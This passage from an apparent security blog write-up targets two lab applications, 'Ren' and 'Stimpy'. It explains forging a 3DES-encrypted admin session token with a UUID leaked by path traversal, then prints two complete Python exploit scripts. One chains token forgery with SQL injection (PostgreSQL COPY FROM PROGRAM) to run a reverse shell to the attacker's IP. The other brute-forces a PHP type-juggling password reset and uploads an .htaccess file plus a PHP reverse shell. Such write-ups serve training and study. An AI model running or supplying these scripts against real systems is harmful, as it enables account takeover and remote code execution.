</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">encryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);
</span></span><span style="display:flex;"><span>            Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);
</span></span><span style="display:flex;"><span>            cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">ENCRYPT_MODE</span>, key);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> Base64.<span style="color:#50fa7b">getUrlEncoder</span>().<span style="color:#50fa7b">encodeToString</span>(enc);
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> SecretKey <span style="color:#50fa7b">getKeyForUser</span>(String email, String uuid) <span style="color:#8be9fd;font-style:italic">throws</span> Exception {
</span></span><span style="display:flex;"><span>        MessageDigest md <span style="color:#ff79c6">=</span> MessageDigest.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;SHA-256&#34;</span>);
</span></span><span style="display:flex;"><span>        String keyText <span style="color:#ff79c6">=</span> uuid <span style="color:#ff79c6">+</span> email;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> keyArray <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>24<span style="color:#ff79c6">]</span>;
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">arraycopy</span>(md.<span style="color:#50fa7b">digest</span>(keyText.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>)), 0, keyArray, 0, 24);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> SecretKeySpec(keyArray, <span style="color:#f1fa8c">&#34;DESede&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the <code>decryptToken()</code> method is used to decrypt the session token from the user&rsquo;s session cookie. the UUID is combined with the user&rsquo;s email to create a <strong>3DES</strong> encryption key using the <code>getKeyForUser()</code> method. this key is then used to decrypt the session token (which contains information about the user&rsquo;s privileges, like their role).</p>
<p>here&rsquo;s the annotated code, so you can understand what&rsquo;s going on under the hood.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">decryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);  <span style="color:#6272a4">// generate the decryption key</span>
</span></span><span style="display:flex;"><span>        Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);  <span style="color:#6272a4">// set up the 3DES cipher</span>
</span></span><span style="display:flex;"><span>        cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">DECRYPT_MODE</span>, key);  <span style="color:#6272a4">// initialize the cipher for decryption</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> Base64.<span style="color:#50fa7b">getUrlDecoder</span>().<span style="color:#50fa7b">decode</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));  <span style="color:#6272a4">// decode the base64 token</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> plain <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(enc);  <span style="color:#6272a4">// decrypt the token</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> String(plain, <span style="color:#f1fa8c">&#34;UTF-8&#34;</span>);  <span style="color:#6272a4">// return the plaintext token</span>
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> SecretKey <span style="color:#50fa7b">getKeyForUser</span>(String email, String uuid) <span style="color:#8be9fd;font-style:italic">throws</span> Exception {
</span></span><span style="display:flex;"><span>    MessageDigest md <span style="color:#ff79c6">=</span> MessageDigest.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;SHA-256&#34;</span>);
</span></span><span style="display:flex;"><span>    String keyText <span style="color:#ff79c6">=</span> uuid <span style="color:#ff79c6">+</span> email;  <span style="color:#6272a4">// concatenate the UUID + email</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> keyArray <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>24<span style="color:#ff79c6">]</span>;  <span style="color:#6272a4">// 3DES key size</span>
</span></span><span style="display:flex;"><span>    System.<span style="color:#50fa7b">arraycopy</span>(md.<span style="color:#50fa7b">digest</span>(keyText.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>)), 0, keyArray, 0, 24);  <span style="color:#6272a4">// generate the key</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> SecretKeySpec(keyArray, <span style="color:#f1fa8c">&#34;DESede&#34;</span>);  <span style="color:#6272a4">// return the 3DES key</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the <code>getKeyForUser()</code> method generates a decryption key by concatenating the UUID and the email, hashes it using <strong>SHA-256</strong>, and truncates the result to 24 bytes (the length needed for 3DES). the 3DES cipher is initialized using the generated key, and the token is decrypted and returned as a <strong>plain text string</strong>.</p>
<p>once the token is decrypted, i can <strong>modify the role</strong> within it to escalate my privileges. all i have to do is append the <code>|1</code> flag (<code>1</code> represents admin status) to the token and re-encrypt it, using the same UUID and the target email.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">encryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);  <span style="color:#6272a4">// generate the encryption key</span>
</span></span><span style="display:flex;"><span>        Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);
</span></span><span style="display:flex;"><span>        cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">ENCRYPT_MODE</span>, key);  <span style="color:#6272a4">// initialize the cipher for encryption</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));  <span style="color:#6272a4">// encrypt the token</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> Base64.<span style="color:#50fa7b">getUrlEncoder</span>().<span style="color:#50fa7b">encodeToString</span>(enc);  <span style="color:#6272a4">// return the base64-encoded encrypted token</span>
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>here are the complete exploits for both Ren + Stimpy!</p>
<h3 id="exploit-ren">exploit: Ren</h3>
<p>goal: get admin access + execute RCE, using path traversal, token manipulation, and SQL injection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 1: set up my IP and target URL</span>
</span></span><span style="display:flex;"><span>my_ip <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]  <span style="color:#6272a4"># attacker IP address is passed as an argument</span>
</span></span><span style="display:flex;"><span>target <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://&lt;IP&gt;&#39;</span>     <span style="color:#6272a4"># target application URL</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 2: generate random username + email</span>
</span></span><span style="display:flex;"><span>username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(random<span style="color:#ff79c6">.</span>choice(string<span style="color:#ff79c6">.</span>ascii_lowercase) <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>))
</span></span><span style="display:flex;"><span>email <span style="color:#ff79c6">=</span> username <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;@ren.local&#39;</span>  <span style="color:#6272a4"># email with the generated username</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 3: initialize session and get main page</span>
</span></span><span style="display:flex;"><span>session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>Session()
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/&#39;</span>)  <span style="color:#6272a4"># target&#39;s homepage</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 4: create an account on the target application</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/signup&#39;</span>, data<span style="color:#ff79c6">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;submit&#39;</span>: <span style="color:#f1fa8c">&#39;Submit&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;email&#39;</span>: email,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;password&#39;</span>: <span style="color:#f1fa8c">&#39;L0r3m1p$uM&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;username&#39;</span>: username
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 5: log in and capture the &#39;rememberme&#39; session token</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login&#39;</span>, data<span style="color:#ff79c6">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;submit&#39;</span>: <span style="color:#f1fa8c">&#39;Submit&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;username&#39;</span>: username,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;password&#39;</span>: <span style="color:#f1fa8c">&#39;L0r3m1p$uM&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;rememberme&#39;</span>: <span style="color:#ff79c6">True</span>  <span style="color:#6272a4"># remember me token is stored in the session</span>
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>myuser_token <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>cookies<span style="color:#ff79c6">.</span>get_dict()[<span style="color:#f1fa8c">&#34;rememberme&#34;</span>]  <span style="color:#6272a4"># extract the rememberme token</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 6: exploit path traversal vulnerability to retrieve UUID</span>
</span></span><span style="display:flex;"><span>uuid <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/download?id=..././conf/uuid&#39;</span>)<span style="color:#ff79c6">.</span>text  <span style="color:#6272a4"># UUID is the encryption key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 7: decrypt the token, modify it to escalate privileges, and re-encrypt</span>
</span></span><span style="display:flex;"><span>process <span style="color:#ff79c6">=</span> subprocess<span style="color:#ff79c6">.</span>Popen([<span style="color:#f1fa8c">&#39;java&#39;</span>, <span style="color:#f1fa8c">&#39;Tokenizer&#39;</span>, myuser_token, email, <span style="color:#f1fa8c">&#39;admin@ren.local&#39;</span>, uuid], stdout<span style="color:#ff79c6">=</span>subprocess<span style="color:#ff79c6">.</span>PIPE)
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">5</span>)  <span style="color:#6272a4"># wait for subprocess to complete</span>
</span></span><span style="display:flex;"><span>out, err <span style="color:#ff79c6">=</span> process<span style="color:#ff79c6">.</span>communicate()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 8: if there&#39;s an error, print it and exit</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> err:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(err)
</span></span><span style="display:flex;"><span>    exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 9: retrieve the admin token from the output</span>
</span></span><span style="display:flex;"><span>tokenadmin <span style="color:#ff79c6">=</span> out<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 10: log in as admin using the manipulated token</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login&#39;</span>, cookies<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;rememberme&#39;</span>: tokenadmin})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 11: craft the reverse shell payload and encode it in base64</span>
</span></span><span style="display:flex;"><span>b64payload <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import socket, subprocess, os, pty;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s.connect((&#34;</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, 4444));  # Connect to my IP
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 0);  # Redirect stdin
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 1);  # Redirect stdout
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 2);  # Redirect stderr
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pty.spawn(&#34;/bin/bash&#34;)  # Spawn a bash shell
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 12: exploit SQL injection vulnerability to run the reverse shell</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/admin/users/category?id=1; COPY(SELECT convert_from(decode(&#39;&#34;</span> <span style="color:#ff79c6">+</span> b64payload<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&#39;, &#39;base64&#39;), &#39;utf-8&#39;)) to &#39;/tmp/shell.py&#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;python3 /tmp/shell.py&#39;;&#34;</span>)
</span></span></code></pre></div><h3 id="exploit-stimpy">exploit: Stimpy</h3>
<p>goal: gain admin access + RCE using type juggling and arbitrary file upload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 1: set up my IP and target URL</span>
</span></span><span style="display:flex;"><span>my_ip <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]  <span style="color:#6272a4"># IP</span>
</span></span><span style="display:flex;"><span>target <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://&lt;IP&gt;&#34;</span>     <span style="color:#6272a4"># target URL</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 2: admin account details</span>
</span></span><span style="display:flex;"><span>email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;admin@stimpy.tld&#34;</span>  <span style="color:#6272a4"># admin email to target</span>
</span></span><span style="display:flex;"><span>password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;L0r3m1p$uM&#39;</span>   <span style="color:#6272a4"># new admin password to set</span>
</span></span><span style="display:flex;"><span>ts <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(time<span style="color:#ff79c6">.</span>time())       <span style="color:#6272a4"># generate timestamp for the reset link</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 3: initialize session and open target&#39;s homepage</span>
</span></span><span style="display:flex;"><span>session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>Session()
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 4: function to request a password reset link</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ResetLink</span>():
</span></span><span style="display:flex;"><span>    session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/forgot&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;email&#39;</span>: email})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 5: function to test if reset token is valid using type juggling</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Test</span>():
</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>)  <span style="color:#6272a4"># type juggling with magic hash</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;Reset your password below&#34;</span> <span style="color:#ff79c6">in</span> resp<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>  <span style="color:#6272a4"># success, token accepted</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>  <span style="color:#6272a4"># try again</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 6: brute force magic hash and change admin password</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
</span></span><span style="display:flex;"><span>    ResetLink()  <span style="color:#6272a4"># request password reset link</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> Test():  <span style="color:#6272a4"># check if reset link is accepted</span>
</span></span><span style="display:flex;"><span>        session<span style="color:#ff79c6">.</span>post(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;password&#39;</span>: password})  <span style="color:#6272a4"># reset password</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;hell yeah brother!&#39;</span>)  <span style="color:#6272a4"># success message</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 7: log in as admin using the new password</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;email&#39;</span>: email, <span style="color:#f1fa8c">&#39;password&#39;</span>: password})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 8: exploit arbitrary file upload to gain RCE</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># upload .htaccess to allow execution of PHP files with unusual extensions</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;.htaccess&#39;</span>, <span style="color:#f1fa8c">&#39;RewriteEngine on</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">RewriteRule shell.php shell.php6&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 9: upload reverse shell as PHP6 file</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;shell.php6&#39;</span>, <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&lt;?php $s=fsockopen(&#34;</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, 4444); $p=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s), $pipes); ?&gt;&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 10: execute the reverse shell</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/imports/shell.php&#39;</span>)
</span></span></code></pre></div></main>


    <br>
    <hr>
    
      Next: <a href="//localhost:1313/posts/cosmos-2/">cosmos, part 2: domain &#43; forest compromise</a>
    




<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/new_post10/" style="float: right"
      >next: reading list [updated]</a
    >
     
    <a class="previous" href="/posts/cosmos-2/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
